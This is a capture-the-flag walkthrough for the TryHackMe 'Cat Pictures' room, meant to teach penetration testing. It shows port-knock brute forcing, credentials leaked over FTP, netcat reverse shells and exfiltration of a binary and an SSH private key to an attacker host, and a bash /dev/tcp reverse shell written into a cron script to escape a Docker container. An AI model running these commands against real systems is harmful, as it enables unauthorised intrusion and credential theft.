---
tags:
  - THM
  - Linux
  - Easy
  - Port-Knock
  - Brute-Force
  - Leakage
  - RCE
  - File-Analysis
  - Docker
  - Cron
---
https://tryhackme.com/room/catpictures/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.6.50.104 cats.thm
```
# Scanning
```console
$ nmap -p22,4420,8080 -sV -sC cats.thm

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
4420/tcp open  nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open  http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Cat Pictures - Index page
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4420-TCP:V=7.95%I=7%D=5/31%Time=683BB3BF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\
SF:x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20ar
SF:e\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\
SF:nPlease\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,
SF:C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20
SF:do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x
SF:20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPl
SF:ease\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Cl
SF:osed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note
SF::\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the
SF:\x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20n
SF:ot\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\
SF:.\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20
SF:SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x
SF:20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20t
SF:he\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password
SF::\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"I
SF:NTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x2
SF:0not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fix
SF:ing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\
SF:x20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## Forum
There is a **forum** for cat pictures in **port 8080**.

One of the [posts](http://cats.thm:8080/viewtopic.php?p=2), contains a hint suggesting **port knocking**:
```text
POST ALL YOUR CAT PICTURES HERE
  
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```
## Port Knocking
Clone a Python **port knocking** tool:
```console
$ git clone https://github.com/eliemoutran/KnockIt

$ cd KnockIt
```
Try all possible combinations to trigger a new service:
```bash
python3 knockit.py --bruteforce cats.thm 1111 2222 3333 4444
```
**FTP** is now open with a `note.txt` file:
```console
$ nmap -p- --open -sS --min-rate 5000 -n -Pn cats.thm
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
4420/tcp open  nvm-express
8080/tcp open  http-proxy

$ nmap -p21 -sV -sC cats.thm
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.50.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```
## FTP
Found some **credentials** in `note.txt` file:
```console
$ curl -s ftp://anonymous@cats.thm/note.txt

In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```
# Exploitation
## Shell Service
Connect to the machine's shell service with found **credentials**:
```console
$ nc cats.thm 4420

INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
```
Found an **executable**, but we can not read it or run it:
```console
whoami
/bin/sh: 1: whoami: not found

ls /home
catlover

ls /home/catlover
runme

cat /home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.

/home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Send a reverse shell using the available tools:
```console
ls /bin && ls /usr/bin
bash
cat
echo
ls
nc
rm
sh
mkfifo
touch
wget

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER-IP> <PORT> > /tmp/f
```
## Executable Manipulation
Now, we can read and run the **executable**:
```console
# /home/catlover/runme

Please enter yout password:
```
Wait for file transfer:
```bash
nc -lvnp <PORT> > runme
```
Send the **executable** to the attacker's machine:
```bash
nc <ATTACKER-IP> <PORT> < /home/catlover/runme
```
The **executable** generates **SSH keys** when providing a **password**:
```console
$ strings runme | grep -C 3 password

[A\]
[]A\A]A^A_
rebecca
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
```
Run again the **executable** in the target's machine:
```console
# /home/catlover/runme

Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued!
```
Wait for file transfer again:
```bash
nc -lvnp <PORT> > id_rsa
```
Send the **generated SSH key** to the attacker's machine:
```bash
nc <ATTACKER-IP> <PORT> < /home/catlover/id_rsa
```
Connect with **private SSH key** to escape the shell service:
```bash
ssh -i id_rsa catlover@cats.thm
```
# Post-Exploitation
We are **root** but SSH was in a **Docker container**:
```console
# whoami
root

# hostname
7546fa2336d6
```
Get the **first flag**:
```bash
cat /root/flag.txt
```
The command history shows a possible **cron job** running `/opt/clean/clean.sh`:
```console
# uniq -u /.bash_history

ip a
ifconfig
apt install ifconfig
ip
exit
nano /opt/clean/clean.sh 
ping 192.168.4.20
apt install ping
apt update
apt install ping
apt install iptuils-ping
apt install iputils-ping
exit
ls
cat /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh 
cat /opt/clean/clean.sh 
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
cat /var/log/dpkg.log
```
There are no **cron jobs** running on the **container**, so they are probably on the real machine:
```console
# cat /etc/crontab

cat: /etc/crontab: No such file or directory
```
There is a **mount point** on `/opt/clean`, so it is probably used in the real machine:
```console
# mount | grep ^/dev

/dev/nvme1n1p1 on /bitnami/phpbb type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/nvme1n1p1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/nvme1n1p1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/nvme1n1p1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/nvme1n1p1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```
Modify the `/opt/clean/clean.sh` script to send a reverse shell:
```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
```
Wait for connections until the **cron job** gets executed:
```bash
nc -lvnp <PORT>
```
We are already **root**, so get the **second flag**:
```bash
cat /root/root.txt
```